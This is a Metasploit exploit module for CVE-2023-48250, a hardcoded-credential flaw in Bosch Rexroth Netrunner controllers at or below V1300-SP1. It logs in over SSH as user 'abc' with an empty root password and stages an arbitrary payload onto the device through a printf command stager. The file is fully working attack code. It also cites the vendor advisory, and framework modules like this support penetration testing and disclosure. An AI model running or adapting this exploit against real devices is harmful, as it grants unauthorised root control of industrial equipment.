##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/ssh'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::SSH

  attr_accessor :ssh_socket




  def initialize(info = {})
    super(update_info(info,
      "Name" => 'Authenticated RCE via hardcoded credentials in Bosche Cordless Netrunner <= V1300-SP1',
      "Description" => 'The Bosche Cordless Netrunner at versions below V1300-SP1 have hardcoded null root passwords.',
      "Author" => [
        "Marshall Whittaker",    # oxagast
      ],
      "License" => MSF_LICENSE,
      "References" => [
        ["URL", "https://psirt.bosch.com/security-advisories/BOSCH-SA-711465.html"],
        ["URL", "https://nvd.nist.gov/vuln/detail/CVE-2023-48250"],
        ["CVE", "CVE-2023-48250"],
        ["CWE", "798"],
      ],
      "Targets" => [
        ["Rexroth Bosche Netrunner <= V1300-SP1", { "Privileged" => true }],
      ],
      "Notes" => {
        'Stability' => [CRASH_SAFE],
        'Reliability' => [REPEATABLE_SESSION],
        'SideEffects' => [ARTIFACTS_ON_DISK]
      },

      'DefaultOptions'   =>
      {
        'PrependFork'  => 'true',
        'EXITFUNC'     => 'process'
      },
      'Payload'          =>
      {
        'Space'        => 4000,
        'DisableNops'  => true
      },
      'Platform'         => 'linux',
      'CmdStagerFlavor'  => 'printf',
      'DefaultTarget'    => 0,
      'DisclosureDate'   => 'Jan 08 2024'
    ))

    register_options(
      [
        OptString.new('RHOST', [ true, "The target address" ]),
        Opt::RPORT(22)
      ], self.class
    )
    deregister_options('SSL', 'SSLCERT', 'RHOSTS')
  end

  def execute_command(cmd, opts = {})
    begin
      Timeout.timeout(5) do
        self.ssh_socket.exec!("#{cmd}\n")
      end
    rescue ::Exception
    end
  end

  def login(ip, port)
    user = 'abc'
    opt_hash = {
      :auth_methods  => ['password', 'keyboard-interactive'],
      :port          => port,
      :use_agent     => false,
      :config        => false,
      :password      => '',
      :proxy         => ssh_socket_factory,
      :non_interactive => true
    }

    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']

    begin
      self.ssh_socket = Net::SSH.start(ip, user, opt_hash)
    rescue Rex::ConnectionError
      fail_with(Failure::Unreachable, 'Disconnected preauth')
    rescue Net::SSH::Disconnect, ::EOFError
      fail_with(Failure::Disconnected, 'Connection timed out')
    rescue Net::SSH::AuthenticationFailed
      fail_with(Failure::NoAccess, 'Bad password (not vulnerable)')
    rescue Net::SSH::Exception => e
      fail_with(Failure::Unknown, "Unknown SSH Error")
    end

    if not self.ssh_socket
      fail_with(Failure::Unknown, 'Couldn\'t open socket')
    end
    return
  end

  def exploit
    ip = datastore['RHOST']
    prt = datastore['RPORT']
    login(ip, prt)
    print_good("Staging...")
    execute_cmdstager({:linemax => 500})

    self.ssh_socket.close
  end
end

